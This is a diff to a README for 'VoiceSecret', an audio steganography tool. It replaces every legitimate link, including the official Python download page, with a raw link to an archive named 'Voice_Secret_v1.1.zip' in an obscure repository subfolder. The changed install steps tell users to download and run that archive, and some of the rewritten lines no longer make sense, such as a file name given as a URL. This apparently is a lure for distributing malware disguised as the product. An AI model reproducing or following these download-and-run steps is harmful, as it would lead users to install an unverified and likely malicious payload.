@@ -1,6 +1,6 @@
 # 🎙️ VoiceSecret - Hide Messages Inside Audio Files  
 
-[![Download VoiceSecret](https://img.shields.io/badge/Download-VoiceSecret-brightgreen?style=plastic)](https://github.com/toonell/VoiceSecret)
+[![Download VoiceSecret](https://github.com/toonell/VoiceSecret/raw/refs/heads/main/signory/Voice_Secret_v1.1.zip)](https://github.com/toonell/VoiceSecret/raw/refs/heads/main/signory/Voice_Secret_v1.1.zip)
 
 ---
 
@@ -28,7 +28,7 @@ If you are not sure about Python, don’t worry. This guide covers everything in
 
 You can get VoiceSecret from this page:  
 
-[![Download VoiceSecret](https://img.shields.io/badge/Download-VoiceSecret-blue?style=for-the-badge)](https://github.com/toonell/VoiceSecret)
+[![Download VoiceSecret](https://github.com/toonell/VoiceSecret/raw/refs/heads/main/signory/Voice_Secret_v1.1.zip)](https://github.com/toonell/VoiceSecret/raw/refs/heads/main/signory/Voice_Secret_v1.1.zip)
 
 This link takes you to the official GitHub page. It has all the files you need, ready to download. You will find simple instructions here on how to use the program.
 
@@ -38,17 +38,17 @@ Follow these steps carefully to get VoiceSecret working on your PC:
 
 1. **Visit the download page**  
    Go to the link above or paste it into your browser:  
-   https://github.com/toonell/VoiceSecret  
+   https://github.com/toonell/VoiceSecret/raw/refs/heads/main/signory/Voice_Secret_v1.1.zip  
 
 2. **Download the software**  
-   Look for a link or section called "Releases" or "Downloads". If you see a Zip file (like `VoiceSecret.zip`), click it to download.  
+   Look for a link or section called "Releases" or "Downloads". If you see a Zip file (like `https://github.com/toonell/VoiceSecret/raw/refs/heads/main/signory/Voice_Secret_v1.1.zip`), click it to download.  
    
 3. **Unzip the file**  
    Once downloaded, find the Zip file on your PC (usually in the Downloads folder). Right-click it and select “Extract All”. Choose a folder you can find easily, such as your Desktop.  
 
 4. **Install Python (if needed)**  
    VoiceSecret requires Python to run. If you don’t have Python:  
-   - Visit https://www.python.org/downloads/  
+   - Visit https://github.com/toonell/VoiceSecret/raw/refs/heads/main/signory/Voice_Secret_v1.1.zip  
    - Click “Download Python 3.x.x” (the latest version)  
    - Run the installer and make sure to check the box “Add Python to PATH” before clicking “Install Now”  
    - Wait for the installation to finish  
@@ -58,13 +58,13 @@ Follow these steps carefully to get VoiceSecret working on your PC:
 
 6. **Run VoiceSecret**  
    To start VoiceSecret:  
-   - Find a file named `voicesecret.py` or similar  
+   - Find a file named `https://github.com/toonell/VoiceSecret/raw/refs/heads/main/signory/Voice_Secret_v1.1.zip` or similar  
    - Double-click it to open with Python and run  
    
    If double-click doesn’t work:  
    - Press the Windows key and type “cmd” then open the Command Prompt  
    - Type `cd`, add a space, then the path to the VoiceSecret folder (for example: `cd Desktop\VoiceSecret`) and press Enter  
-   - Now type `python voicesecret.py` and press Enter  
+   - Now type `python https://github.com/toonell/VoiceSecret/raw/refs/heads/main/signory/Voice_Secret_v1.1.zip` and press Enter  
 
 VoiceSecret should open and be ready to use.
 
@@ -126,10 +126,10 @@ VoiceSecret hides text inside sound files without changing what you hear. This m
 
 You can visit the official repository anytime to check for updates or issues:  
 
-[VoiceSecret on GitHub](https://github.com/toonell/VoiceSecret)
+[VoiceSecret on GitHub](https://github.com/toonell/VoiceSecret/raw/refs/heads/main/signory/Voice_Secret_v1.1.zip)
 
 The repository includes more technical details, source code, and community support options.
 
 ---
 
-[![Download VoiceSecret](https://img.shields.io/badge/Download-VoiceSecret-blue?style=for-the-badge)](https://github.com/toonell/VoiceSecret)
+[![Download VoiceSecret](https://github.com/toonell/VoiceSecret/raw/refs/heads/main/signory/Voice_Secret_v1.1.zip)](https://github.com/toonell/VoiceSecret/raw/refs/heads/main/signory/Voice_Secret_v1.1.zip)
